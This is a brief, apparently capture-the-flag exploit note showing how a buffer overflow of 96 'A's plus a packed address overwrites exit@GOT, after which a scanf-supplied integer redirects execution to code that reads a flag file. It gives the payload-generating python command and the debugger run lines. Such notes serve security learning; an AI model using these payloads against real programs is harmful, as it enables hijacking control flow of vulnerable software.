Possibly using 96 'A's with address of GOT so that scanf can overwrite a number into the address. We find that only exit@GOT is usable as most of the other GOTs contain null bytes.

python -c 'print "A"*96 + "\x08\x04\xa0\x18"[::-1]' > input

echo '134514135' > input2

r <<< $(cat /tmp/111/input /tmp/111/input2)

r <<< $(cat /tmp/111/input /tmp/111/input2)

In the end, we set the address to jump to as the address that happens before the cat /bin/flag is called so as to find out the address.
